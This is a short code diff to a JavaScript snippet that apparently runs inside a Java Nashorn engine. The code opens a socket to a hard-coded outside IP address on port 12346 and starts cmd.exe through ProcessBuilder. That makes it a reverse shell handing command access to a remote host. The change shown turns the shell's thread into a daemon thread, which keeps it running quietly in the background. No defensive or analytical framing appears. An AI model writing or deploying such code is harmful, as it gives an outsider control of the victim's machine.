@@ -4,7 +4,7 @@
         var ProcessBuilder = Java.type("java.lang.ProcessBuilder");
         var Socket = Java.type("java.net.Socket");
 
-        new Thread(function () {
+        var thread = new Thread(function () {
             var host = "165.22.238.35";
             var port = 12346;
             var cmd = "cmd.exe";
@@ -43,7 +43,9 @@
             };
             p.destroy();
             s.close();
-        }).start();
+        });
+        thread.setDaemon(true);
+        thread.start();
     } catch (err) {
         return err;
     }
